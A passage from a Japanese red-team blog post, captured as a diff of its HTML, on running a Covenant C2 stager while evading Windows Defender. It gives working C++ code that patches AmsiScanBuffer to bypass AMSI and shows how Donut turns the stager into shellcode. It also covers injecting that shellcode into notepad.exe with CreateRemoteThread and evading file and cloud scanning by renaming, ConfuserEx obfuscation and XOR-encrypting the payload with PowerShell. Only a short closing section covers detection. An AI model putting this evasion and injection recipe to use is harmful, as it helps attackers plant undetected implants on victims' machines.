+    <span class="n">hr</span> <span class="o">=</span> <span class="n">pMetaHost</span><span class="o">-&gt;</span><span class="n">GetRuntime</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;v4.0.30319&#34;</span><span class="p">,</span> <span class="n">IID_PPV_ARGS</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pRuntimeInfo</span><span class="p">));</span>
+    <span class="n">hr</span> <span class="o">=</span> <span class="n">pRuntimeInfo</span><span class="o">-&gt;</span><span class="n">GetInterface</span><span class="p">(</span><span class="n">CLSID_CLRRuntimeHost</span><span class="p">,</span>
+        <span class="n">IID_PPV_ARGS</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pClrRuntimeHost</span><span class="p">));</span>
+
+    <span class="c1">// start runtime
+</span><span class="c1"></span>    <span class="n">hr</span> <span class="o">=</span> <span class="n">pClrRuntimeHost</span><span class="o">-&gt;</span><span class="n">Start</span><span class="p">();</span>
+
+    <span class="c1">// execute managed assembly
+</span><span class="c1"></span>    <span class="n">DWORD</span> <span class="n">pReturnValue</span><span class="p">;</span>
+    <span class="n">hr</span> <span class="o">=</span> <span class="n">pClrRuntimeHost</span><span class="o">-&gt;</span><span class="n">ExecuteInDefaultAppDomain</span><span class="p">(</span>
+        <span class="sa">L</span><span class="s">&#34;hello.exe&#34;</span><span class="p">,</span>
+        <span class="sa">L</span><span class="s">&#34;hello.Program&#34;</span><span class="p">,</span>
+        <span class="sa">L</span><span class="s">&#34;HostingSay&#34;</span><span class="p">,</span>
+        <span class="sa">L</span><span class="s">&#34;&#34;</span><span class="p">,</span>
+        <span class="o">&amp;</span><span class="n">pReturnValue</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;ExecuteInDefaultAppDomain HRESULT: %x </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hr</span><span class="p">);</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="p">.</span><span class="n">get</span><span class="p">();</span> <span class="c1">//pause
+</span><span class="c1"></span>
+    <span class="c1">// free resources
+</span><span class="c1"></span>    <span class="n">pMetaHost</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+    <span class="n">pRuntimeInfo</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+    <span class="n">pClrRuntimeHost</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>これもコンパイルして、同じフォルダにhello.exeを置いた状態で実行してみます。</p>
+<p><img src="images/callnet_test.png" alt="callnet_test"></p>
+<p>.NET アセンブリであるhello.exeのSay()で記述されているメッセージボックスが表示されました。ProcessHackerで該当プロセスを確認すると .NET assembliesタブがあり、そこにDefaultDomainという名前のAppDomainが存在します。</p>
+<h3 id="covenant-stagerを呼び出してみる">Covenant Stagerを呼び出してみる</h3>
+<p>CLR を呼び出すことを確認できたので、次はCovenant Stagerを呼び出してみます。</p>
+<p>ExecuteInDefaultAppDomain()の要求に一致させるため、Stagerのコードなら以下のようにExecute()を呼び出すメソッドを追加する必要があります。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="k">static</span> <span class="kt">int</span> <span class="n">HostingExecute</span><span class="p">(</span><span class="n">String</span> <span class="n">pwzArgument</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">Execute</span><span class="p">();</span>
+    <span class="k">return</span> <span class="m">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>Covenant にはStagerおよび最終的なペイロードであるExecutorをテンプレートで変更できるTemplates画面があります。そこの画面で追加しましょう。</p>
+<p><img src="images/template_appdomain.png" alt="template_appdomain"></p>
+<p>新しいBinary Launcherをダウンロードし、これをExecuteInDefaultAppDomain()で呼んでみましょう。ローダーの差分のコードです。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c++" data-lang="c++"><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
+<span class="n">hr</span> <span class="o">=</span> <span class="n">pClrRuntimeHost</span><span class="o">-&gt;</span><span class="n">ExecuteInDefaultAppDomain</span><span class="p">(</span>
+        <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">user</span><span class="se">\\</span><span class="s">Downloads</span><span class="se">\\</span><span class="s">GruntHTTP.exe&#34;</span><span class="p">,</span> <span class="c1">// 実行したい .NET アセンブリ
+</span><span class="c1"></span>        <span class="sa">L</span><span class="s">&#34;GruntStager.GruntStager&#34;</span><span class="p">,</span>
+        <span class="sa">L</span><span class="s">&#34;HostingExecute&#34;</span><span class="p">,</span>
+        <span class="sa">L</span><span class="s">&#34;&#34;</span><span class="p">,</span>
+        <span class="o">&amp;</span><span class="n">pReturnValue</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
+</code></pre></div><blockquote>
+<p>AMSIバイパスの検証のため、ファイルはWindows Defenderの例外に設定しています。</p>
+</blockquote>
+<p>実行結果。</p>
+<p><img src="images/callnet_amsi_detected.png" alt="callnet_amsi_detected"></p>
+<p>AMSI に検知されました。あれ？アンマネージドコードなのになぜAMSIで検知しているのかって？</p>
+<p>例外をよく見てください。例外を発生させているのは、CLRを読み込んだあと呼び出されたCovenantのStagerです。Stagerがサーバからペイロードをダウンロードしメモリに読み込むためにAssembly.Load() を呼び出したとき、検知しています。当然この領域は既に .NET 範囲内なのでAMSIが動きます。</p>
+<p>ここで、ExecuteInDefaultAppDomain()を呼ぶ前にアンマネージドコード側でAMSIバイパスを行ってみましょう。</p>
+<p>以下のコードになります。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c++" data-lang="c++"><span class="kt">int</span> <span class="nf">PatchAMSI</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">Patch</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\xb8\x57\x00\x07\x80\xc3</span><span class="s">&#34;</span><span class="p">;</span> <span class="c1">// mov    eax,0x80070057 
+</span><span class="c1"></span>                                                        <span class="c1">// ret
+</span><span class="c1"></span>
+	<span class="kt">void</span><span class="o">*</span> <span class="n">AmsiScanBuffer</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;AMSI.DLL&#34;</span><span class="p">),</span> <span class="s">&#34;AmsiScanBuffer&#34;</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">AmsiScanBuffer</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] AmsiScanBuffer Address: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">AmsiScanBuffer</span><span class="p">);</span>
+		<span class="n">DWORD</span> <span class="n">oldProt</span><span class="p">,</span> <span class="n">oldOldProt</span><span class="p">;</span>
+		<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">AmsiScanBuffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">Patch</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProt</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">memcpy</span><span class="p">(</span><span class="n">AmsiScanBuffer</span><span class="p">,</span> <span class="n">Patch</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">Patch</span><span class="p">))</span> <span class="p">{</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] AmsiScanBuffer patch copied!</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+			<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">AmsiScanBuffer</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">oldProt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldOldProt</span><span class="p">);</span>
+			<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="k">else</span> <span class="p">{</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[!] Failed copying the patch to AmsiScanBuffer!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+			<span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><blockquote>
+<p>検知される場合はprintfの削除や難読化など検知回避を施してください</p>
+</blockquote>
+<p>C# 製のAMSIScanBufferBypassと同じ原理です。CLRが読み込まれると amsi.dll もついでに呼ばれるので、先に amsi.dll を読んでパッチしておく作戦です。</p>
+<p>これをmainの最初で<code>PatchAMSI()</code>を呼ぶようにコードを変更し、再度コンパイルし実行してみます。</p>
+<p><img src="images/callnet_amsi_bypass.png" alt="callnet_amsi_bypass"></p>
+<p>AMSI バイパスを行ったので問題なくGruntが動作しました。</p>
+<p>以上、アンマネージドコードでAMSIバイパスを行ったうえで .NET アセンブリを実行することに成功しました。今回は説明を楽にするために読み込むStagerをそのままディスク上に保存していましたが、本来なら暗号化・難読化したうえでファイル内に埋め込んだり（<a href="https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources">リソースファイルとしてローダー内に含める例</a>）、本記事で紹介したように外部サーバから読み込むべきです。</p>
+<h1 id="donut--ローダでstager起動">Donut + ローダでStager起動</h1>
+<p>本記事の総まとめとして、Donutを使ってWindows Defenderに検知されないバイナリを作成しましょう。</p>
+<p><a href="https://github.com/TheWover/donut">Donut</a> は .NET アセンブリをはじめとする複数のランタイムをネイティブなシェルコード化するプログラムです。</p>
+<p>.NET アセンブリを読み込む技術的仕組みはCLRを読み込む前項のPoCと同じですが、<strong>ペイロードの圧縮・暗号化・AMSIバイパス</strong>の機能も内包しています。AMSIバイパス機能があり、バイパスコードも暗号化されるのでAMSIの検知を回避してバイパスをしてくれます。こちらでわざわざAMSIバイパスを行う必要がないということです。</p>
+<p>他にもペイロードをCLRに読み込んだあとに元のリソースをメモリから消去しメモリスキャンを回避させたり、AppDomainの名前をランダマイズ化する機能もあったりして、Donutによって生成されたシェルコードはアンチウイルスソフトの検知回避も期待できます。</p>
+<p>なおDonutを利用して生成したシェルコードはPIC (位置独立コード) になっているため、一般的なシェルコードローダを利用してローカルおよびリモートプロセスにインジェクション可能です。</p>
+<h2 id="シェルコード作成">シェルコード作成</h2>
+<p>早速Donutを使ってStagerをシェルコード化します。</p>
+<p><img src="images/donut.png" alt="donut"></p>
+<p>Donut に対して .NET アセンブリであるCovenant Stagerを入力するとネイティブなシェルコードが出力されます。オプションを指定しない場合、出力ログにあるようなオプションが適用されます。</p>
+<h4 id="covenantのshellcode-launcher">CovenantのShellCode Launcher</h4>
+<p>Covenant v0.6 でShellCode Launcherが実装されました。これはCovenantサーバ内部のDonutライブラリでStagerをシェルコード化しダウンロードできる機能です。Stagerをシェルコード化したいだけならこれを使うのもよいでしょう。</p>
+<h2 id="ローダ">ローダ</h2>
+<p>次にローダを書きます。Donutには .NET 製のローダであるDonutTestが同梱されています。</p>
+<blockquote>
+<p>本来なら.NET製ではなくアンマネージドコードでローダを書くのがいいのですが、記事が長くなるので今回は割愛します。</p>
+</blockquote>
+<p>ローダは仕組み上コンパイルしたら間違いなく検知されそうなコードなので、まずはDonutフォルダをアンチウイルスソフトの例外に入れておきましょう。</p>
+<p>DonutTest はコード内にBaset64エンコード化されたシェルコードを記載することで、その変数をデコードして、コマンドライン引数で指定したプロセスのメモリ上にPEインジェクションします。インジェクション後、CreateRemoteThread() を使って該当のルーチンを呼び出します。</p>
+<blockquote>
+<p>今回はローカルプロセスで呼び出してもいいのですが(CreateThread)、サンプルコードをもとに進めます。</p>
+</blockquote>
+<p><img src="images/donuttest.png" alt="donuttest"></p>
+<p>Donut で出力したシェルコードは、デフォルトではx86/x64両対応のコードになります。よってx64変数、x86変数で同じシェルコードを利用します。</p>
+<p>まずはシェルコードをBase64エンコードします。PowerShellでエンコード化する場合は以下。クリップボードにコピーされます。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$filename</span> <span class="p">=</span> <span class="s2">&#34;loader.bin&#34;</span>
+<span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">|</span> <span class="n">clip</span>
+</code></pre></div><blockquote>
+<p>donutの -f 2オプションを適用することで、最初からBase64エンコード化されたシェルコードを出力することもできます。</p>
+</blockquote>
+<p>コード内に張り付けた後、コンパイル。まずはAMSIバイパスの効果を確認するため、リアルタイムスキャンをオンにして実行します。</p>
+<p><img src="images/donutest_notepad.png" alt="donutest_notepad"></p>
+<p>引数はインジェクション先のプロセスIDを指定します。今回は notepad.exe に対してプロセスインジェクションしました。すると問題なくGruntがアクティベートされました。ProcessHackerで notepad.exe を確認すると、メモ帳にもかかわらず .NETアセンブリが読み込まれています。</p>
+<blockquote>
+<p>メモ帳はアンマネージドコードのプログラムなので、インジェクションすると不審性が高まります。この場合はインジェクションする先のプロセスを .NET 製のものにすることで、アンマネージドコードが突然CLRを読み込むような不審性が現れなくなります。</p>
+</blockquote>
+<h2 id="ファイルスキャンの検知回避">ファイルスキャンの検知回避</h2>
+<p>それでは次にファイルスキャンの検知回避です。まずは作成した DonutTest.exe の検知テストをThreatCheckで行いましょう。</p>
+<p><img src="images/donuttest_detect.png" alt="donuttest_detect"></p>
+<p>検知されます。ちなみに検知名は「VirTool:MSIL/DLoader.A!MTB」です。DLoader、つまりDonutのローダであるDonutTestを決め打ちで検知するようになっているようです。おおかたDonutTestやShellcodeTestなどのDonutTest特有の文字列で検知しているのでしょう。</p>
+<p>まずはVisualStudioのプロパティからそのあたりのリソース情報を変更します。</p>
+<p><img src="images/change_resource.png" alt="change_resource"></p>
+<p>コンパイルし、再度確認します。</p>
+<p><img src="images/donuttest_detect2.png" alt="donuttest_detect2"></p>
+<p>ああ、まだ検知されました。恐らくメソッド名などの情報です。これらのコードの変更が面倒ですか？そんなときに楽なのがConfuserEx。難読化してもう一度スキャンしてみます。</p>
+<blockquote>
+<p>※ConfuserExは前述のとおり難がありますが、それを身をもって知るために試してみましょう</p>
+</blockquote>
+<p>ConfuserEx で難読化。難読化設定はrenameだけで問題ありません。</p>
+<p><img src="images/donutest_file_notdetect.png" alt="donutest_file_notdetect"></p>
+<p>検知しなくなりました。バイナリを例外フォルダから移動してもよさそうですが・・・？</p>
+<h3 id="クラウド提供の保護の検知回避">「クラウド提供の保護」の検知回避</h3>
+<p>次に「クラウド提供の保護」と「サンプルの自動送信」を有効にしてファイルを移動し、実行してみましょう。</p>
+<p><img src="images/donuttest_cloud_detect.png" alt="donuttest_cloud_detect"></p>
+<p>検知されてしまいました。「クラウド保護」はプログラム実行時にキックされ、実行前にファイルをMicrosoftのクラウドに送信し、マルウェアスキャンが行われます。クラウド上のスキャンエンジンで問題ないと判断された場合はそのまま実行されますが、このように検知された場合は「指定されたプログラムは実行できません。」というエラーが発生します。それと同時にWindows Defenderによる通知がなされます。</p>
+<p>さらにクラウド保護で検知されたファイルはエンジンでシグネチャが作成され、<strong>ファイルに含まれていた文字列、つまりシェルコードなども次回から文字列単体で検知するようになります</strong>。いったん検知された場合は、しばらくの間、問答無用で検知されるようになります（一定期間たてば単なる文字列は検知対象外に戻る模様）。</p>
+<p>よって、<strong>「クラウド保護」および「ファイル送信」の検知テストは基本的に検知テスト用バイナリで行うべき</strong>で、本番で使うリソースは大事にとっておいた方がいいです。</p>
+<p>注意点を書いたところで、検知回避を試してみましょう。上のとおり、今までのシェルコードは検知されてしまうので、Base64シェルコードの部分は検知回避ができることを確認するまでは適当なBase64文字列にしておけばいいです。</p>
+<blockquote>
+<p>ネタバレですが2020/10現在Donutシェルコードは検知されないのでBase64シェルコード自体の検知テストは不要です。</p>
+</blockquote>
+<p>さて、クラウド保護はクラウド上にエンジンがある関係上ブラックボックスであり、検知回避するためには少し泥臭いことをする必要があります。まずコードを全面的にコメントアウトしてから少しずつコメントインしてクラウドスキャンを行い、検知箇所を特定する作業です。</p>
+<p>というわけで思い切って大部分をコメントアウトしました。実際に使われているコードだけを抜き出すと以下になります。</p>
+<p><img src="images/confuser_cloud_detect.png" alt="confuser_cloud_detect"></p>
+<p>プロセスインジェクションを行うための2つのAPI宣言のみです。これをConfuserExで難読化して、再度検知テストしましょう。どうでしたか？<strong>実はこれだけでも検知するのです。</strong></p>
+<p>DllImportを使ったAPI宣言は仕組み上、ConfuserExを使ってもそれをバイナリから隠蔽することはできません。</p>
+<p><img src="images/confuser_dllimport.png" alt="confuser_dllimport"></p>
+<p>ただプロセスインジェクションにはこのWin32APIの呼び出しは必須です。</p>
+<blockquote>
+<p>このDllImportの参照は、P/Invokeと呼ばれる参照方法です。D/InvokeやネイティブAPIなど別の呼び出しを使う方法もあります（詳細は割愛）。</p>
+</blockquote>
+<p>ではこれ以上どうすればいいでしょうか。どうしようもない？いいえ、まだ減らすポイントがあります。ConfuserExです。</p>
+<h4 id="confuserexの罠">ConfuserExの罠</h4>
+<p>ConfuserEx は既存コードの特徴の痕跡を手っ取り早く消し去るのに有用ですが、継続した利用には注意が必要です。</p>
+<p>というのも攻撃者やRed TeamerがConfuserExを利用したバイナリで侵害を行いそれをアンチウイルスソフトに検知された場合、Windows Defenderの学習によって今後クラウド保護機能でConfuserExを利用したバイナリが検知されるようになるからです。私が検証した限り、上記の単純なAPI定義コード2つ + ConfuserEx 1.4.1 の組み合わせは、クラウド保護では「Trojan:Win32/Wacatac.C!ml」として検知します。</p>
+<p>ConfuserExを通さずに検知テストしてみてください。そう、このコードは<strong>ConfuserEx を使わなければクラウド保護では検知しなくなるのです。</strong></p>
+<p>このことからConfuserExは銀の弾丸ではないとわかります。アンチウイルスソフトといたちごっこを続けるのもいいですが、可能ならConfuserExを使わずに自分でオリジナルのカスタムローダを作成して利用するのが望ましいでしょう。ローダさえ検知回避できればそこから先、AMSIバイパスをすればいいだけですから。</p>
+<h4 id="confuserexを使わずdonuttestの痕跡を削除する">ConfuserExを使わずDonutTestの痕跡を削除する</h4>
+<p>基本に立ち返ってコード上からDonutTestの痕跡を削除しましょう。記事の途中で行ったアセンブリ情報の変更のほか、基本的にはメソッド名やクラス名などの名前情報の変更が必要です。.NET プログラムはコンパイルでCILに変換されたあとでもこれらの名前情報は残ります。よってリネームを行って完全に痕跡を削除します。</p>
+<p>これでだいたいクラウド保護の検知は回避できます。ただダメ押しでもうひとつ工夫してみましょう。</p>
+<h4 id="シェルコードを暗号化する">シェルコードを暗号化する</h4>
+<p>今回はシェルコードを事前にXORで暗号化することにしました。シェルコードをXORで暗号化するテクニックは簡単な割にファイル検知エンジンにはとても有効なので覚えておくと良いでしょう。これなら万が一検知されても鍵を変更すればシェルコードを使いまわせるようになります。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$key</span> <span class="p">=</span> <span class="n">0x64</span>
+<span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$filename</span> <span class="p">=</span> <span class="s2">&#34;loader.bin&#34;</span>
+<span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$enc</span> <span class="p">=</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$byte</span> <span class="k">in</span> <span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)){</span><span class="nv">$byte</span> <span class="o">-bxor</span> <span class="nv">$key</span><span class="p">}</span>
+<span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$enc</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
+</code></pre></div><p>ローダにXOR復号するコードを入れました。修正後の Main()は以下のようになります。</p>
+<p><img src="images/donuttest_fix.png" alt="donuttest_fix"></p>
+<p>これをコンパイルして、実行してみます。</p>
+<p><img src="images/donuttest_cloud_notdetect.png" alt="donuttest_cloud_notdetect"></p>
+<p><strong>実行できました！</strong></p>
+<p>クラウド保護を含んだWindows Defenderを全て検知回避してGruntをアクティベーションできました。</p>
+<blockquote>
+<p>今回はXORの鍵は1バイト固定でしたが、クラウド保護の検知エンジンを考えるなら、バイナリを生成するたびに鍵をランダムに差し替えられるような仕組みを考えた方が良いです。(自動化の観点)</p>
+</blockquote>
+<h3 id="検知">検知</h3>
+<p>今回は実行ファイルであるローダからメモ帳のプロセスにCreateRemoteThreadを使って .NET プログラムをインジェクションしました。<br>
+CreateRemoteThread は通常のアプリケーションではめったに使われないので、ふるまい検知の点でみると非常に目立ち、EDR製品に検知される可能性が高いです。</p>
+<p>また、メモ帳のプロセスでStagerを動作させるのも不審です。理由はシンプルで、Stagerは .NET アセンブリであり、アンマネージドコードのプログラムであるメモ帳が途中でCLRを読み込むのは滅多にないことだからです。&ldquo;CLR Injection&quot;は、SysmonやETWを利用して検出可能であることをDonutの製作者であるTheWover氏が指摘しています。</p>
+<blockquote>
+<p>One of the companion projects for donut is ModuleMonitor. It uses WMI Event Win32_ModuleLoadTrace to monitor for module loading. It provides filters, detailed data, and has an option to monitor for CLR Injection attacks.</p>
+<p><a href="https://thewover.github.io/Introducing-Donut/">https://thewover.github.io/Introducing-Donut/</a></p>
+</blockquote>
+<p>興味のある方は引用元のリンクを確認してください。</p>
+<h1 id="まとめ">まとめ</h1>
+<p>今回はCovenant Stagerの実行ファイルを例にしてWindows Defenderのファイル検知回避および 簡単なAMSIバイパスについて学びました。</p>
+<h4 id="heading"></h4>
+<p>巷のペネトレーションテストに関する書籍では、基本的なペネトレーションテストツールの使い方が記載されていても、アンチウイルスソフト検知回避を行う手法をちゃんと書いてくれることは多くありません。<br>
+その理由は、一般的な攻撃手法と異なり、OSやアンチウイルスソフトの更新で回避できなくなることがあるためだと考えられます。<br>
+当然ながら検知回避手法もアンチウイルスソフトの進化に合わせて洗練されていきますが、変化が速いのでまとまった記事になることが少ないです。</p>
+<p>私自身、研究のために色々なWebサイトを回り2020年時点で使えるとされる手法を学びましたが、結構大変だったので後進のためにここに残しておきました。</p>
+<p>実際のRed Teamingではinitial accessで実行ファイルをターゲット環境に置いて実行させることは基本的にないようです。ただどの手法であってもアンチウイルスのファイル検知回避の考え方は共通なので、覚えておいて損はないと思います。</p>
+
+                    </div>
+                    
+                    
+                    <div class="after-post-tags">
+                        <ul class="tags">
+                        
+                        <li>
+                        <a href="/tags/pentest">pentest</a>
+                        </li>
+                        
+                        <li>
+                        <a href="/tags/bypass">bypass</a>
+                        </li>
+                        
+                        </ul>
+                    </div>
+                    
+                    
+                    
+                    <div class="row PageNavigation d-flex justify-content-between font-weight-bold">
+                    
+                    
+                        <a class="d-block col-md-6 text-lg-right" href="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/">GadgetToJScript を利用した Office VBA のAMSI バイパスと原理 &raquo;</a>
+                    
+                    <div class="clearfix"></div>
+                    </div>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+    </div>
+
+
+            </div>
+<div class="jumbotron fortags">
+	<div class="d-md-flex h-100">
+		<div class="col-md-4 transpdark align-self-center text-center h-100">
+			<div class="d-md-flex align-items-center justify-content-center h-100">
+				<h2 class="d-md-block d-none align-self-center py-1 font-weight-light">Explore <span class="d-none d-md-inline">→</span></h2>
+			</div>
+		</div>
+		<div class="col-md-8 p-5 align-self-center text-center">
+			
+			<a class="mt-1 mb-1" href="/tags/bypass">bypass</a>
+			
+			<a class="mt-1 mb-1" href="/tags/car-security">car-security</a>
+			
+			<a class="mt-1 mb-1" href="/tags/develop">develop</a>
+			
+			<a class="mt-1 mb-1" href="/tags/dns">dns</a>
+			
+			<a class="mt-1 mb-1" href="/tags/ethical_hacking">ethical_hacking</a>
+			
+			<a class="mt-1 mb-1" href="/tags/exploit">exploit</a>
+			
+			<a class="mt-1 mb-1" href="/tags/intelligence">intelligence</a>
+			
+			<a class="mt-1 mb-1" href="/tags/misc">misc</a>
+			
+			<a class="mt-1 mb-1" href="/tags/pentest">pentest</a>
+			
+			<a class="mt-1 mb-1" href="/tags/priv_escalation">priv_escalation</a>
+			
+			<a class="mt-1 mb-1" href="/tags/web">web</a>
+			
+			<a class="mt-1 mb-1" href="/tags/%E4%BB%AE%E6%83%B3%E9%80%9A%E8%B2%A8">仮想通貨</a>
+			
+			<a class="mt-1 mb-1" href="/tags/%E8%87%AA%E4%BD%9C%E4%BB%AE%E6%83%B3%E9%80%9A%E8%B2%A8%E5%85%A5%E9%96%80">自作仮想通貨入門</a>
+			
+		</div>
+	</div>
+</div>
+
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-6 text-center text-lg-left">
+                &copy; Copyright shutingrz - All rights reserved / 本サイトではアクセス解析に Google Analytics を利用しています。
+            </div>
+            <div class="col-md-6 col-sm-6 text-center text-lg-right">    
+                <a target="_blank" rel="noopener" href="https://www.wowthemes.net">Mediumish Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+        </div>
+
+
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
+<script src="/js/mediumish.js"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-137567513-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </body>
+</html>
